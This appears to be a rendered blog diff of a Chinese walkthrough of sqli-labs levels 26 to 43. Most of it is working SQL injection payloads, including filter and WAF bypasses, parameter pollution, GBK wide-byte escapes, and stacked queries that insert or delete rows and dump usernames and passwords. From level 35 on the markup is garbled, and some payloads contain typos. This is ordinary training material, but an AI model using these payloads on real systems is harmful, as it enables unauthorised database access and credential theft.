+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;%0aunion%0aselect%0a1,2,database()oorr%0a&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>发现报错，%0a被过滤了</p>
+<p>在使用报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(select(database())),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>爆破数据表，注意information </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema)=&#x27;security&#x27;),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>爆破users表的列</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name)=&#x27;users&#x27;),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>爆破用户名和密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(select(group_concat(username,&#x27;:&#x27;,passwoorrd))from(users)),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="less-26a"><a href="#less-26a" class="headerlink" title="less-26a"></a>less-26a</h3><p>与上题类似，闭合方式为<code>&#39;)</code></p>
+<p>发现报错注入失败</p>
+<p>再试试%A0或者%a0或者%0a或者%0b</p>
+<h3 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h3><p>过滤了select和union,以大小写的方式绕过</p>
+<p>爆破数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(database())),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>爆破数据表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(group_concat(table_name) from(information_schema.tables)where(table_schema)=&#x27;security&#x27;),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>爆users表的列</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;users&#x27;),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>爆用户名和密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(group_concat(username,&#x27;:&#x27;,password))from(users)),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="less-27a"><a href="#less-27a" class="headerlink" title="less-27a"></a>less-27a</h3><p>闭合方式为<code>&quot;</code></p>
+<p>爆数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;||updatexml(1,concat(0x7e,(sElect(database())),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>同样，没有报错回显</p>
+<p>试试%A0或者%0a或者%0A</p>
+<h3 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h3><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311000455246.png" alt="image-20230311000455246"></p>
+<p>尝试使用报错注入发现报错注入被屏蔽</p>
+<p>判断字段数，使用%0a代替空格。%00截断</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)%0Aorder%0Aby%0A3%0A;%00</span><br></pre></td></tr></table></figure>
+
+<p>判断回显位</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)%0aunion%0aselect%0a1,2,3;%00</span><br></pre></td></tr></table></figure>
+
+
+
+<p>爆破数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=a&#x27;)%0aunion%0aselect%0a1,2,database();%00</span><br></pre></td></tr></table></figure>
+
+
+
+<p>爆破数据表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=a&#x27;)%0aunion%0aselect%0a1,2,group_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=&#x27;security&#x27;;%00</span><br></pre></td></tr></table></figure>
+
+
+
+<p>爆破数据表中的列</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,2,group_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_name=&#x27;users&#x27;;%00</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查询数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,2,group_concat(username,&#x27;:&#x27;,password)%0afrom%0ausers;%00</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="less-29"><a href="#less-29" class="headerlink" title="less-29"></a>less-29</h3><p>简单尝试注入</p>
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311001709085.png" alt="image-20230311001709085"></p>
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311001811540.png" alt="image-20230311001811540"></p>
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311001843390.png" alt="image-20230311001843390"></p>
+<p>发现可以直接注入</p>
+<p>进入login.php界面</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login.php?id=1&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311002031510.png" alt="image-20230311002031510"></p>
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311002637553.png" alt="image-20230311002637553"></p>
+<p>说明我们的参数被WAF阻挡，此时加入第二个参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=2</span><br></pre></td></tr></table></figure>
+
+<p>判断子段数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=2&#x27; order by 4--+</span><br></pre></td></tr></table></figure>
+
+
+
+<p>判断回显位</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=2&#x27; union select 1,2.3--+</span><br></pre></td></tr></table></figure>
+
+
+
+<p>爆数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=2&#x27; union select 1,2.database()--+</span><br></pre></td></tr></table></figure>
+
+
+
+<p>报数据表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=2&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>
+
+
+
+<p>爆数据表中的列</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-1&quot; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查询数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-1&quot; union select 1,group_concat(username,&#x27;:&#x27;,password),3 from users --+</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h3 id="less-30"><a href="#less-30" class="headerlink" title="less-30"></a>less-30</h3><p>与上一关类似</p>
+<p>闭合方式位<code>&quot;</code></p>
+<p>同上</p>
+<h3 id="less-31"><a href="#less-31" class="headerlink" title="less-31"></a>less-31</h3><p>闭合方式为<code>&quot;)</code></p>
+<p>同上</p>
+<h3 id="less-32"><a href="#less-32" class="headerlink" title="less-32"></a>less-32</h3><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311003845733.png" alt="image-20230311003845733"></p>
+<p>首先输入?id&#x3D;1’，发现进行了转义</p>
+<p>将单引号与双引号都进行了转义</p>
+<blockquote>
+<p>当数据库的编码为GBK时，可以使用宽字节注入，宽字节的格式是在地址后先加一个%df，再加单引号，因为反斜杠的编码为%5c，而在GBK编码中，%df%5c是繁体字“連”，所以这时，单引号成功逃逸。</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhengna/p/12660680.html">Sqli-labs Less-32 宽字节注入 嵌套查询 - zhengna - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62879498/article/details/122558222">sql-lab (32~35)包含对 宽字节注入的原理理解及注意事项（后持续更新）_hcjtn的博客-CSDN博客</a></p>
+<p>爆破数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,database() --+</span><br></pre></td></tr></table></figure>
+
+<p>爆破数据表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database()) --+</span><br></pre></td></tr></table></figure>
+
+<p>爆破数据表中的列</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database()) --+</span><br></pre></td></tr></table></figure>
+
+<p>查询数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,(select group_concat(username,0x3a,password) from users)--+</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="less-33"><a href="#less-33" class="headerlink" title="less-33"></a>less-33</h3><p>addslashes()函数：addslashes() 函数返回在预定义的字符前添加反斜杠的字符串。</p>
+<p>预定义字符是：</p>
+<ul>
+<li>单引号（’）</li>
+<li>双引号（”）</li>
+<li>反斜杠（\）</li>
+<li>NULL</li>
+</ul>
+<p>实际上和上一题相同</p>
+<h3 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h3><p>post方式传参，实际上与前两题一样，传参方式不同</p>
+<p>在url栏中输入 %df 主要是以 16进制形式输入，而在输入框输入 %df 则是以普通字符串输入的。</p>
+<p>绕过方法：有些汉字的编码为三个字节的编码，我们将三个字节拆开来看，前两个为一组，后面的那个和 \ 相编码为两字节绕过，从而使得单引号逃逸。</p>
+<p>判断子段数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">汉&#x27; order by 3 #</span><br></pre></td></tr></table></figure>
+
+<p>判断回显位</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">汉&#x27; union select 1,2 #</span><br></pre></td></tr></table></figure>
+
+<p>爆破数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">汉&#x27; union select 1,database() #</span><br></pre></td></tr></table></figure>
+
+<p>爆破数据表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">汉&#x27; union select 1,table_name from information_schema.tables where table_schema= database() limit 3,1 #</span><br></pre></td></tr></table></figure>
+
+<p>爆破数据列</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">汉&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  #</span><br></pre></td></tr></table></figure>
+
+<p>爆破用户名和密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">汉&#x27; union select 1,(select group_concat(username,0x3a,password) from users) #</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h3 id="less-35"><a href="#less-35" class="headerlink" title="less-35"></a>less-35</h3><ol>
+<li>题目提示：id没有被单引号括起来所以addslashes起不到作用</li>
+</ol>
+<p>故直接注入即可</p>
+<ol start="2">
+<li><pre><code>?id=1 and 1=2 union select 1,(select group_concat(username,password separator 0x3c62723e) from security.users),3%23
+0x3c62723e是十六进制的表示，对于ASCLL中的,可以将数据排列的整齐点
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">### less-36</span><br><span class="line"></span><br><span class="line">get类型</span><br><span class="line"></span><br><span class="line">mysql_real_escape_string()函数：转义在 SQL 语句中使用的字符串中的特殊字符。</span><br><span class="line"></span><br><span class="line">下列字符受影响：</span><br><span class="line"></span><br><span class="line">- \x00</span><br><span class="line">- \n</span><br><span class="line">- \r</span><br><span class="line">- \</span><br><span class="line">- ’</span><br><span class="line">- &quot;</span><br><span class="line">- \x1a</span><br><span class="line"></span><br><span class="line">可以使用 %df 进行绕过</span><br><span class="line"></span><br><span class="line">直接宽字节注入</span><br><span class="line"></span><br><span class="line">爆破数据库</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?id=-1%df&#39; union select 1,2,database() --+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">爆破数据表</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?id=-1%df&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database()) --+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">爆破数据表中的列</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?id=-1%df&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database()) --+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">查询数据</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?id=-1%df&#39; union select 1,2,(select group_concat(username,0x3a,password) from users)--+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### less-37</span><br><span class="line"></span><br><span class="line">post类型</span><br><span class="line"></span><br><span class="line">同34</span><br><span class="line"></span><br><span class="line">判断子段数</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+汉&#39; order by 3 #
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">判断回显位</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+汉&#39; union select 1,2 #
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">爆破数据库</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+汉&#39; union select 1,database() #
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">爆破数据表</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+汉&#39; union select 1,table_name from information_schema.tables where table_schema= database() limit 3,1 #
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">爆破数据列</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+汉&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  #
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">爆破用户名和密码</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+汉&#39; union select 1,(select group_concat(username,0x3a,password) from users) #
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### less-38</span><br><span class="line"></span><br><span class="line">#### 堆叠注入</span><br><span class="line"></span><br><span class="line">`mysqli_multi_query()` 函数：执行一个或多个针对数据库的查询。多个查询用分号进行分隔。</span><br><span class="line"></span><br><span class="line">我们就可以在普通注入的后面，写上一条任意的SQL语句，例如插入数据，或者删库。</span><br><span class="line"></span><br><span class="line">查询数据库</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?id=-1&#39; union select 1,2,database() --+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查询数据表</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">查询数据表中的列</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">此时，就可以在users下插入用户名数据</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?id=-1&#39; ;insert into users(id,username,password)values(100,&#39;tsl&#39;,&#39;nibaba&#39;);
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">写入后，可以查询到信息</span><br><span class="line"></span><br><span class="line">也可以删除用户数据</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?id=-1&#39;) ;delete from users where id=100;
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### less-39</span><br><span class="line"></span><br><span class="line">整形堆叠注入</span><br><span class="line"></span><br><span class="line">同上</span><br><span class="line"></span><br><span class="line">查询数据库</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?id=-1 union select 1,2,database() --+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查询数据表</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">查询数据表中的列</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">此时，就可以在users下插入用户名数据</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?id=-1 ;insert into users(id,username,password)values(100,&#39;tsl&#39;,&#39;nibaba&#39;);
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">写入后，可以查询到信息</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### less-40</span><br><span class="line"></span><br><span class="line">闭合方式为`’)`的堆叠注入</span><br><span class="line"></span><br><span class="line">查询数据库</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?id=-1&#39;) union select 1,2,database() --+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查询数据表</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?id=-1&#39;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">查询数据表中的列</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?id=-1&#39;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">此时，就可以在users下插入用户名数据</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?id=-1&#39;) ;insert into users(id,username,password)values(100,&#39;tsl&#39;,&#39;nibaba&#39;);
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">写入后，可以查询到信息</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### less-41</span><br><span class="line"></span><br><span class="line">堆叠注入，闭合类型为整型</span><br><span class="line"></span><br><span class="line">查询数据库</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?id=-1 union select 1,2,database() --+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查询数据表</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">查询数据表中的列</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### less-42</span><br><span class="line"></span><br><span class="line">对username进行了过滤，password处注入</span><br><span class="line"></span><br><span class="line">爆破数据表</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">爆破数据表中的列</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; #
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">爆破用户名和密码</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+&#39; union select 1,group_concat(username,&#39;:&#39;,password),2 from users #
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### less-43</span><br><span class="line"></span><br><span class="line">闭合方式为`&#x27;)&#x27;`</span><br><span class="line"></span><br><span class="line">同上</span><br><span class="line"></span><br><span class="line">爆破数据表</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">爆破数据表中的列</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; #
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">爆破用户名和密码</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+&#39; union select 1,group_concat(username,&#39;:&#39;,password),2 from users #
